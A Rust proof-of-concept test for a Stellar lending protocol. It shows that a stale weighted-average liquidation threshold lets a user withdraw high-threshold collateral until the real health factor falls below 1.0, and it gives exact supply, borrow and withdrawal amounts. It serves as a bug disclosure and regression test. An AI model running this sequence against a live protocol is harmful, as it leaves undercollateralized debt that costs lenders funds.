#![cfg(test)]
//! PoC: Stale weighted-average liquidation threshold allows unsafe withdrawal
//!
//! Bug: validate_user_can_withdraw() subtracts the withdrawal value from
//! total_collateral_base but reuses the OLD weighted-average liquidation
//! threshold. When withdrawing a high-threshold asset (e.g., USDC at 8500),
//! the remaining threshold should drop (e.g., to 6500 for XLM-only), but
//! the code keeps the inflated blended average — overestimating post-withdrawal HF.
//!
//! Scenario:
//!   - Asset A ("USDC"): liq_threshold = 8500 (85%)
//!   - Asset B ("XLM"):  liq_threshold = 6500 (65%)
//!   - User supplies both, borrows against them, then withdraws all of Asset A.
//!   - The withdrawal should be blocked (HF would drop below 1.0) but the
//!     stale threshold lets it through.

use crate::{a_token, debt_token, interest_rate_strategy, kinetic_router, price_oracle};
use price_oracle::Asset as OracleAsset;
use k2_shared::WAD;
use soroban_sdk::{
    testutils::{Address as _, Ledger, LedgerInfo},
    token, Address, Env, IntoVal, String, Symbol, Vec,
};

// Mock Reflector Oracle
use soroban_sdk::{contract, contractimpl};

#[contract]
pub struct MockReflector;

#[contractimpl]
impl MockReflector {
    pub fn decimals(_env: Env) -> u32 {
        14
    }
}

fn setup_interest_rate_strategy(env: &Env, admin: &Address) -> Address {
    let contract_id = env.register(interest_rate_strategy::WASM, ());
    let mut init_args = Vec::new(env);
    init_args.push_back(admin.clone().into_val(env));
    init_args.push_back((0u128).into_val(env));                     // base rate
    init_args.push_back((40_000_000_000_000_000_000u128).into_val(env)); // slope1
    init_args.push_back((100_000_000_000_000_000_000u128).into_val(env)); // slope2
    init_args.push_back((800_000_000_000_000_000_000_000_000u128).into_val(env)); // optimal
    let _: () = env.invoke_contract(&contract_id, &Symbol::new(env, "initialize"), init_args);
    contract_id
}

/// Register an aToken + debtToken pair and init a reserve for `underlying_addr`.
fn init_reserve(
    env: &Env,
    admin: &Address,
    pool_configurator: &Address,
    kinetic_router: &kinetic_router::Client,
    kinetic_router_addr: &Address,
    oracle_client: &price_oracle::Client,
    interest_rate_strategy: &Address,
    underlying_addr: &Address,
    decimals: u32,
    ltv: u32,
    liquidation_threshold: u32,
    price: u128,          // 14-decimal oracle price
) -> (Address, Address) {
    let a_token_addr = env.register(a_token::WASM, ());
    let a_token_client = a_token::Client::new(env, &a_token_addr);
    a_token_client.initialize(
        admin,
        underlying_addr,
        kinetic_router_addr,
        &String::from_str(env, "aToken"),
        &String::from_str(env, "aTKN"),
        &decimals,
    );

    let debt_token_addr = env.register(debt_token::WASM, ());
    let debt_token_client = debt_token::Client::new(env, &debt_token_addr);
    debt_token_client.initialize(
        admin,
        underlying_addr,
        kinetic_router_addr,
        &String::from_str(env, "debtToken"),
        &String::from_str(env, "dTKN"),
        &decimals,
    );

    let treasury = Address::generate(env);
    let params = kinetic_router::InitReserveParams {
        decimals,
        ltv,
        liquidation_threshold,
        liquidation_bonus: 500,
        reserve_factor: 1000,
        supply_cap: 0,
        borrow_cap: 0,
        borrowing_enabled: true,
        flashloan_enabled: false,
    };

    kinetic_router.init_reserve(
        pool_configurator,
        underlying_addr,
        &a_token_addr,
        &debt_token_addr,
        interest_rate_strategy,
        &treasury,
        &params,
    );

    // Register price in oracle
    let asset_oracle = OracleAsset::Stellar(underlying_addr.clone());
    oracle_client.add_asset(admin, &asset_oracle);
    oracle_client.set_manual_override(
        admin,
        &asset_oracle,
        &Some(price),
        &Some(env.ledger().timestamp() + 86400),
    );

    (a_token_addr, debt_token_addr)
}

/// PoC: withdrawing the high-threshold collateral bypasses HF check.
///
/// Expected: withdrawal is rejected (HF would drop below 1.0).
/// Actual (with bug): withdrawal succeeds because the code reuses the stale
///   blended threshold instead of recalculating.
#[test]
fn test_poc_stale_threshold_allows_unsafe_withdrawal() {
    let env = Env::default();
    env.mock_all_auths();
    #[allow(deprecated)]
    env.budget().reset_unlimited();
    env.ledger().set(LedgerInfo {
        sequence_number: 100,
        protocol_version: 23,
        timestamp: 1000,
        network_id: Default::default(),
        base_reserve: 10,
        min_temp_entry_ttl: 10,
        min_persistent_entry_ttl: 10,
        max_entry_ttl: 1_000_000,
    });

    let admin = Address::generate(&env);
    let user = Address::generate(&env);
    let lp   = Address::generate(&env);

    // --- Deploy router + oracle ---
    let router_addr = env.register(kinetic_router::WASM, ());
    let router = kinetic_router::Client::new(&env, &router_addr);

    let oracle_addr = env.register(price_oracle::WASM, ());
    let oracle = price_oracle::Client::new(&env, &oracle_addr);

    let reflector_addr = env.register(MockReflector, ());
    let base_currency = Address::generate(&env);
    let native_xlm = Address::generate(&env);
    oracle.initialize(&admin, &reflector_addr, &base_currency, &native_xlm);

    let dex_router = Address::generate(&env);
    router.initialize(&admin, &admin, &oracle_addr, &Address::generate(&env), &dex_router, &None);
    let pool_configurator = Address::generate(&env);
    router.set_pool_configurator(&pool_configurator);

    let irs = setup_interest_rate_strategy(&env, &admin);

    // --- Asset A: "USDC-like", high threshold ---
    //   LTV=8000 (80%), liquidation_threshold=8500 (85%), price=$1.00
    let token_admin_a = Address::generate(&env);
    let token_a = env.register_stellar_asset_contract_v2(token_admin_a.clone());
    let asset_a = token_a.address();
    let decimals_a: u32 = 7;
    let price_1_dollar: u128 = 100_000_000_000_000; // $1.00 at 14 decimals

    let (_a_token_a, _debt_token_a) = init_reserve(
        &env, &admin, &pool_configurator, &router, &router_addr, &oracle, &irs,
        &asset_a, decimals_a, 8000, 8500, price_1_dollar,
    );

    // --- Asset B: "XLM-like", low threshold ---
    //   LTV=5000 (50%), liquidation_threshold=6500 (65%), price=$1.00 (simplified)
    let token_admin_b = Address::generate(&env);
    let token_b = env.register_stellar_asset_contract_v2(token_admin_b.clone());
    let asset_b = token_b.address();
    let decimals_b: u32 = 7;

    let (_a_token_b, _debt_token_b) = init_reserve(
        &env, &admin, &pool_configurator, &router, &router_addr, &oracle, &irs,
        &asset_b, decimals_b, 5000, 6500, price_1_dollar,
    );

    // --- Seed liquidity so borrows can succeed ---
    let big = 1_000_000_000_000_000u128; // 100M tokens
    let mint_a = token::StellarAssetClient::new(&env, &asset_a);
    let mint_b = token::StellarAssetClient::new(&env, &asset_b);
    mint_a.mint(&lp, &(big as i128));
    mint_b.mint(&lp, &(big as i128));
    let tok_a = token::Client::new(&env, &asset_a);
    let tok_b = token::Client::new(&env, &asset_b);
    let exp = env.ledger().sequence() + 100_000;
    tok_a.approve(&lp, &router_addr, &(big as i128), &exp);
    tok_b.approve(&lp, &router_addr, &(big as i128), &exp);
    router.supply(&lp, &asset_a, &big, &lp, &0u32);
    router.supply(&lp, &asset_b, &big, &lp, &0u32);

    // --- User supplies $1000 of A (high threshold) and $1000 of B (low threshold) ---
    let supply = 10_000_000_000u128; // 1000 tokens * 10^7
    mint_a.mint(&user, &(supply as i128));
    mint_b.mint(&user, &(supply as i128));
    tok_a.approve(&user, &router_addr, &(supply as i128), &exp);
    tok_b.approve(&user, &router_addr, &(supply as i128), &exp);
    router.supply(&user, &asset_a, &supply, &user, &0u32);
    router.supply(&user, &asset_b, &supply, &user, &0u32);

    // Collateral: $1000 A (threshold 8500) + $1000 B (threshold 6500)
    // Weighted avg threshold = (1000*8500 + 1000*6500) / 2000 = 7500
    // Weighted avg LTV = (1000*8000 + 1000*5000) / 2000 = 6500
    // Max borrow at LTV: $2000 * 6500/10000 = $1300
    let acct = router.get_user_account_data(&user);
    assert_eq!(acct.current_liquidation_threshold, 7500, "weighted avg threshold should be 7500");
    assert!(acct.health_factor == u128::MAX, "no debt yet => infinite HF");

    // --- Borrow $1020 of asset A ---
    // This is within the LTV limit ($1300) and within the exploit gap.
    //
    // After withdrawing W=600 of asset A:
    //   Remaining collateral: $400 A + $1000 B = $1400
    //   Correct threshold = (400*8500 + 1000*6500) / 1400 = 7071
    //   Buggy threshold  = 7500 (stale!)
    //
    //   Buggy HF  = $1400 * 7500/10000 / $1020 = $1050/$1020 = 1.029 >= 1.0 (passes!)
    //   Correct HF = $1400 * 7071/10000 / $1020 = $990/$1020 = 0.970 < 1.0 (should block!)
    let borrow_exploit = 10_200_000_000u128; // 1020 tokens * 10^7
    router.borrow(&user, &asset_a, &borrow_exploit, &1u32, &0u32, &user);

    let acct_before_withdraw = router.get_user_account_data(&user);
    assert!(
        acct_before_withdraw.health_factor > WAD,
        "HF should be > 1.0 before exploit withdrawal. Got: {}",
        acct_before_withdraw.health_factor,
    );

    // --- THE EXPLOIT: withdraw $600 of asset A ---
    let withdraw_amount = 6_000_000_000u128; // 600 tokens * 10^7
    let result = router.try_withdraw(&user, &asset_a, &withdraw_amount, &user);

    // --- ASSERTION ---
    // This withdrawal SHOULD FAIL because it drops the real HF below 1.0.
    // If the bug exists, it will SUCCEED (the test will fail here).
    assert!(
        result.is_err(),
        "BUG CONFIRMED: withdrawal succeeded despite real HF dropping below 1.0!\n\
         Post-withdrawal account data: {:?}",
        router.get_user_account_data(&user),
    );
}
